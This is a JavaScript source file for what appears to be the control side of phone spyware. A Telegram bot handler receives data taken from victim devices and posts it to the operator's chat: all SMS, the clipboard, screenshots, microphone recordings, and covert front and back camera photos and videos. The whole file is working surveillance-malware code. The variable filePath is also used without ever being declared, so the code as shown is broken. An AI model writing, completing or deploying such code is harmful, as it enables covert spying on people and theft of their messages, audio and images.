const fs = require("fs");

let sym = "𓏺|𓏺";

class HttpHandler {
    async handle(message, bot, oltg){
        if (message.method == "getAllSMS"){
            if (message.status == true){
                message.edit ? await bot.editMessageMedia(
                    {
                        media: "attach://"+filePath,
                        type: "document",
                        caption: oltg.build(`📥 ${sym} all sms of `) + message.device_id
                    },
                    {
                        parse_mode: "HTML",
                        chat_id: message.chat_id,
                        message_id: message.message_id
                    }
                ).then(async (__) => {
                    fs.unlink(filePath, async (fse) => {console.log(fse.message)})
                }).catch(async (___) => {
                    fs.unlink(filePath, async (fse) => {console.log(fse.message)})
                }) : await bot.sendDocument(
                    message.chat_id,
                    filePath,
                    {
                        reply_to_message_id: message.message_id,
                        caption: oltg.build(`📥 ${sym} all sms of `) + message.device_id
                    }
                ).then(async (__) => {
                    fs.unlink(filePath, async (fse) => {console.log(fse.message)})
                }).catch(async (___) => {
                    fs.unlink(filePath, async (fse) => {console.log(fse.message)})
                })
            } else {
                message.edit ? await bot.editMessageText(
                    oltg.build(`🔴 ${sym} error detected\n - ${message.message}`),
                    {
                        parse_mode: "HTML",
                        chat_id: message.chat_id,
                        message_id: message.message_id
                    }
                ).then(async (__) => {
                    fs.unlink(filePath, async (fse) => {console.log(fse.message)})
                }).catch(async (___) => {
                    fs.unlink(filePath, async (fse) => {console.log(fse.message)})
                }) : await bot.sendMessage(
                    message.chat_id,
                    oltg.build(`🔴 ${sym} error detected\n - ${message.message}`),
                    {
                        reply_to_message_id: message.message_id
                    }
                ).then(async (__) => {
                    fs.unlink(filePath, async (fse) => {console.log(fse.message)})
                }).catch(async (___) => {
                    fs.unlink(filePath, async (fse) => {console.log(fse.message)})
                })
            }
        } else if (message.method == "recordMicrophone"){
            if (message.status == true){
                message.edit ? await bot.editMessageMedia(
                    {
                        media: "attach://"+filePath,
                        type: "audio",
                        caption: oltg.build(`📥 ${sym} recorded microphone of device `) + message.device_id
                    },
                    {
                        parse_mode: "HTML",
                        chat_id: message.chat_id,
                        message_id: message.message_id
                    }
                ).then(async (__) => {
                    fs.unlink(filePath, async (fse) => {console.log(fse.message)})
                }).catch(async (___) => {
                    fs.unlink(filePath, async (fse) => {console.log(fse.message)})
                }) : await bot.sendAudio(
                    message.chat_id,
                    filePath,
                    {
                        reply_to_message_id: message.message_id,
                        caption: oltg.build(`📥 ${sym} recorded microphone of device `) + message.device_id
                    }
                ).then(async (__) => {
                    fs.unlink(filePath, async (fse) => {console.log(fse.message)})
                }).catch(async (___) => {
                    fs.unlink(filePath, async (fse) => {console.log(fse.message)})
                })
            } else {
                message.edit ? await bot.editMessageText(
                    oltg.build(`🔴 ${sym} error detected\n - ${message.message}`),
                    {
                        parse_mode: "HTML",
                        chat_id: message.chat_id,
                        message_id: message.message_id
                    }
                ).then(async (__) => {
                    fs.unlink(filePath, async (fse) => {console.log(fse.message)})
                }).catch(async (___) => {
                    fs.unlink(filePath, async (fse) => {console.log(fse.message)})
                }) : await bot.sendMessage(
                    message.chat_id,
                    oltg.build(`🔴 ${sym} error detected\n - ${message.message}`),
                    {
                        reply_to_message_id: message.message_id
                    }
                ).then(async (__) => {
                    fs.unlink(filePath, async (fse) => {console.log(fse.message)})
                }).catch(async (___) => {
                    fs.unlink(filePath, async (fse) => {console.log(fse.message)})
                })
            }
        } else if (message.method == "getClipboard"){
            if (message.status == true){
                message.edit ? await bot.editMessageMedia(
                    {
                        media: "attach://"+filePath,
                        type: "document",
                        caption: oltg.build(`📥 ${sym} clipboard `) + message.device_id + oltg.build(` is here`)
                    },
                    {
                        parse_mode: "HTML",
                        chat_id: message.chat_id,
                        message_id: message.message_id
                    }
                ).then(async (__) => {
                    fs.unlink(filePath, async (fse) => {console.log(fse.message)})
                }).catch(async (___) => {
                    fs.unlink(filePath, async (fse) => {console.log(fse.message)})
                }) : await bot.sendDocument(
                    message.chat_id,
                    filePath,
                    {
                        reply_to_message_id: message.message_id,
                        caption: oltg.build(`📥 ${sym} clipboard `) + message.device_id + oltg.build(` is here`)
                    }
                ).then(async (__) => {
                    fs.unlink(filePath, async (fse) => {console.log(fse.message)})
                }).catch(async (___) => {
                    fs.unlink(filePath, async (fse) => {console.log(fse.message)})
                })
            } else {
                message.edit ? await bot.editMessageText(
                    oltg.build(`🔴 ${sym} error detected\n - ${message.message}`),
                    {
                        parse_mode: "HTML",
                        chat_id: message.chat_id,
                        message_id: message.message_id
                    }
                ).then(async (__) => {
                    fs.unlink(filePath, async (fse) => {console.log(fse.message)})
                }).catch(async (___) => {
                    fs.unlink(filePath, async (fse) => {console.log(fse.message)})
                }) : await bot.sendMessage(
                    message.chat_id,
                    oltg.build(`🔴 ${sym} error detected\n - ${message.message}`),
                    {
                        reply_to_message_id: message.message_id
                    }
                ).then(async (__) => {
                    fs.unlink(filePath, async (fse) => {console.log(fse.message)})
                }).catch(async (___) => {
                    fs.unlink(filePath, async (fse) => {console.log(fse.message)})
                })
            }
        } else if (message.method == "takeScreenshot"){
            if (message.status == true){
                message.edit ? await bot.editMessageMedia(
                    {
                        media: "attach://"+filePath,
                        type: "photo",
                        caption: oltg.build(`📥 ${sym} screenshot of device `) + message.device_id + oltg.build(` page`)
                    },
                    {
                        parse_mode: "HTML",
                        chat_id: message.chat_id,
                        message_id: message.message_id
                    }
                ).then(async (__) => {
                    fs.unlink(filePath, async (fse) => {console.log(fse.message)})
                }).catch(async (___) => {
                    fs.unlink(filePath, async (fse) => {console.log(fse.message)})
                }) : await bot.sendPhoto(
                    message.chat_id,
                    filePath,
                    {
                        reply_to_message_id: message.message_id,
                        caption: oltg.build(`📥 ${sym} screenshot of device `) + message.device_id + oltg.build(` page`)
                    }
                ).then(async (__) => {
                    fs.unlink(filePath, async (fse) => {console.log(fse.message)})
                }).catch(async (___) => {
                    fs.unlink(filePath, async (fse) => {console.log(fse.message)})
                })
            } else {
                message.edit ? await bot.editMessageText(
                    oltg.build(`🔴 ${sym} error detected\n - ${message.message}`),
                    {
                        parse_mode: "HTML",
                        chat_id: message.chat_id,
                        message_id: message.message_id
                    }
                ).then(async (__) => {
                    fs.unlink(filePath, async (fse) => {console.log(fse.message)})
                }).catch(async (___) => {
                    fs.unlink(filePath, async (fse) => {console.log(fse.message)})
                }) : await bot.sendMessage(
                    message.chat_id,
                    oltg.build(`🔴 ${sym} error detected\n - ${message.message}`),
                    {
                        reply_to_message_id: message.message_id
                    }
                ).then(async (__) => {
                    fs.unlink(filePath, async (fse) => {console.log(fse.message)})
                }).catch(async (___) => {
                    fs.unlink(filePath, async (fse) => {console.log(fse.message)})
                })
            }
        } else if (message.method == "takeFrontshot"){
            if (message.status == true){
                message.edit ? await bot.editMessageMedia(
                    {
                        media: "attach://"+filePath,
                        type: "photo",
                        caption: oltg.build(`📥 ${sym} front-shot picture of device `) + message.device_id + oltg.build(` page`)
                    },
                    {
                        parse_mode: "HTML",
                        chat_id: message.chat_id,
                        message_id: message.message_id
                    }
                ).then(async (__) => {
                    fs.unlink(filePath, async (fse) => {console.log(fse.message)})
                }).catch(async (___) => {
                    fs.unlink(filePath, async (fse) => {console.log(fse.message)})
                }) : await bot.sendPhoto(
                    message.chat_id,
                    filePath,
                    {
                        reply_to_message_id: message.message_id,
                        caption: oltg.build(`📥 ${sym} front-shot picture of device `) + message.device_id + oltg.build(` page`)
                    }
                ).then(async (__) => {
                    fs.unlink(filePath, async (fse) => {console.log(fse.message)})
                }).catch(async (___) => {
                    fs.unlink(filePath, async (fse) => {console.log(fse.message)})
                })
            } else {
                message.edit ? await bot.editMessageText(
                    oltg.build(`🔴 ${sym} error detected\n - ${message.message}`),
                    {
                        parse_mode: "HTML",
                        chat_id: message.chat_id,
                        message_id: message.message_id
                    }
                ).then(async (__) => {
                    fs.unlink(filePath, async (fse) => {console.log(fse.message)})
                }).catch(async (___) => {
                    fs.unlink(filePath, async (fse) => {console.log(fse.message)})
                }) : await bot.sendMessage(
                    message.chat_id,
                    oltg.build(`🔴 ${sym} error detected\n - ${message.message}`),
                    {
                        reply_to_message_id: message.message_id
                    }
                ).then(async (__) => {
                    fs.unlink(filePath, async (fse) => {console.log(fse.message)})
                }).catch(async (___) => {
                    fs.unlink(filePath, async (fse) => {console.log(fse.message)})
                })
            }
        } else if (message.method == "takeBackshot"){
            if (message.status == true){
                message.edit ? await bot.editMessageMedia(
                    {
                        media: "attach://"+filePath,
                        type: "photo",
                        caption: oltg.build(`📥 ${sym} back-shot picture of device `) + message.device_id + oltg.build(` page`)
                    },
                    {
                        parse_mode: "HTML",
                        chat_id: message.chat_id,
                        message_id: message.message_id
                    }
                ).then(async (__) => {
                    fs.unlink(filePath, async (fse) => {console.log(fse.message)})
                }).catch(async (___) => {
                    fs.unlink(filePath, async (fse) => {console.log(fse.message)})
                }) : await bot.sendPhoto(
                    message.chat_id,
                    filePath,
                    {
                        reply_to_message_id: message.message_id,
                        caption: oltg.build(`📥 ${sym} back-shot picture of device `) + message.device_id + oltg.build(` page`)
                    }
                ).then(async (__) => {
                    fs.unlink(filePath, async (fse) => {console.log(fse.message)})
                }).catch(async (___) => {
                    fs.unlink(filePath, async (fse) => {console.log(fse.message)})
                })
            } else {
                message.edit ? await bot.editMessageText(
                    oltg.build(`🔴 ${sym} error detected\n - ${message.message}`),
                    {
                        parse_mode: "HTML",
                        chat_id: message.chat_id,
                        message_id: message.message_id
                    }
                ).then(async (__) => {
                    fs.unlink(filePath, async (fse) => {console.log(fse.message)})
                }).catch(async (___) => {
                    fs.unlink(filePath, async (fse) => {console.log(fse.message)})
                }) : await bot.sendMessage(
                    message.chat_id,
                    oltg.build(`🔴 ${sym} error detected\n - ${message.message}`),
                    {
                        reply_to_message_id: message.message_id
                    }
                ).then(async (__) => {
                    fs.unlink(filePath, async (fse) => {console.log(fse.message)})
                }).catch(async (___) => {
                    fs.unlink(filePath, async (fse) => {console.log(fse.message)})
                })
            }
        } else if (message.method == "recordBack"){
            if (message.status == true){
                message.edit ? await bot.editMessageMedia(
                    {
                        media: "attach://"+filePath,
                        type: "video",
                        caption: oltg.build(`📥 ${sym} back-video of device `) + message.device_id
                    },
                    {
                        parse_mode: "HTML",
                        chat_id: message.chat_id,
                        message_id: message.message_id
                    }
                ).then(async (__) => {
                    fs.unlink(filePath, async (fse) => {console.log(fse.message)})
                }).catch(async (___) => {
                    fs.unlink(filePath, async (fse) => {console.log(fse.message)})
                }) : await bot.sendVideo(
                    message.chat_id,
                    filePath,
                    {
                        reply_to_message_id: message.message_id,
                        caption: oltg.build(`📥 ${sym} back-video of device `) + message.device_id
                    }
                ).then(async (__) => {
                    fs.unlink(filePath, async (fse) => {console.log(fse.message)})
                }).catch(async (___) => {
                    fs.unlink(filePath, async (fse) => {console.log(fse.message)})
                })
            } else {
                message.edit ? await bot.editMessageText(
                    oltg.build(`🔴 ${sym} error detected\n - ${message.message}`),
                    {
                        parse_mode: "HTML",
                        chat_id: message.chat_id,
                        message_id: message.message_id
                    }
                ).then(async (__) => {
                    fs.unlink(filePath, async (fse) => {console.log(fse.message)})
                }).catch(async (___) => {
                    fs.unlink(filePath, async (fse) => {console.log(fse.message)})
                }) : await bot.sendMessage(
                    message.chat_id,
                    oltg.build(`🔴 ${sym} error detected\n - ${message.message}`),
                    {
                        reply_to_message_id: message.message_id
                    }
                ).then(async (__) => {
                    fs.unlink(filePath, async (fse) => {console.log(fse.message)})
                }).catch(async (___) => {
                    fs.unlink(filePath, async (fse) => {console.log(fse.message)})
                })
            }
        } else if (message.method == "recordFront"){
            if (message.status == true){
                message.edit ? await bot.editMessageMedia(
                    {
                        media: "attach://"+filePath,
                        type: "video",
                        caption: oltg.build(`📥 ${sym} front-video of device `) + message.device_id
                    },
                    {
                        parse_mode: "HTML",
                        chat_id: message.chat_id,
                        message_id: message.message_id
                    }
                ).then(async (__) => {
                    fs.unlink(filePath, async (fse) => {console.log(fse.message)})
                }).catch(async (___) => {
                    fs.unlink(filePath, async (fse) => {console.log(fse.message)})
                }) : await bot.sendVideo(
                    message.chat_id,
                    filePath,
                    {
                        reply_to_message_id: message.message_id,
                        caption: oltg.build(`📥 ${sym} front-video of device `) + message.device_id
                    }
                ).then(async (__) => {
                    fs.unlink(filePath, async (fse) => {console.log(fse.message)})
                }).catch(async (___) => {
                    fs.unlink(filePath, async (fse) => {console.log(fse.message)})
                })
            } else {
                message.edit ? await bot.editMessageText(
                    oltg.build(`🔴 ${sym} error detected\n - ${message.message}`),
                    {
                        parse_mode: "HTML",
                        chat_id: message.chat_id,
                        message_id: message.message_id
                    }
                ).then(async (__) => {
                    fs.unlink(filePath, async (fse) => {console.log(fse.message)})
                }).catch(async (___) => {
                    fs.unlink(filePath, async (fse) => {console.log(fse.message)})
                }) : await bot.sendMessage(
                    message.chat_id,
                    oltg.build(`🔴 ${sym} error detected\n - ${message.message}`),
                    {
                        reply_to_message_id: message.message_id
                    }
                ).then(async (__) => {
                    fs.unlink(filePath, async (fse) => {console.log(fse.message)})
                }).catch(async (___) => {
                    fs.unlink(filePath, async (fse) => {console.log(fse.message)})
                })
            }
        }
    }
}

module.exports = { HttpHandler };